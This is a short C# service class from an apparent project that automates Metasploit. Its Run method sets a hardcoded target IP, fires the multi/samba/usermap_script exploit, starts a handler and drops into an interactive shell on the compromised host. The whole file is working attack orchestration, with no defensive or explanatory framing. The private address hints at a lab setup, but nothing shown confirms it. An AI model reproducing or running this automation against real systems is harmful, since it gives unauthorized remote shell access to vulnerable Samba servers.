using System.Linq;
using System.Threading.Tasks;
using Lacey.Alexa.Common.Metasploit.Extensions;
using Lacey.Alexa.Common.Metasploit.Providers;
using Microsoft.Extensions.Logging;

namespace Lacey.Alexa.Explorer.Services.Services.Concrete
{
    public sealed class ExplorerService : IExplorerService
    {
        private readonly ILogger _logger;

        private readonly IMetasploitProvider _metasploit;

        public ExplorerService(
            IMetasploitProvider metasploit, 
            ILogger logger)
        {
            _metasploit = metasploit;
            _logger = logger;
        }

        public async Task Run()
        {
            const string rHost = "192.168.0.14";
            const string exploit = "multi/samba/usermap_script";
            var result = await _metasploit.MultiHandler();
            await _metasploit.Exploit(exploit, rHost);
            var shell = await _metasploit.WaitModuleJob(exploit, result.JobId);
            await _metasploit.ShellInteract(shell.First().Key);
        }
    }
}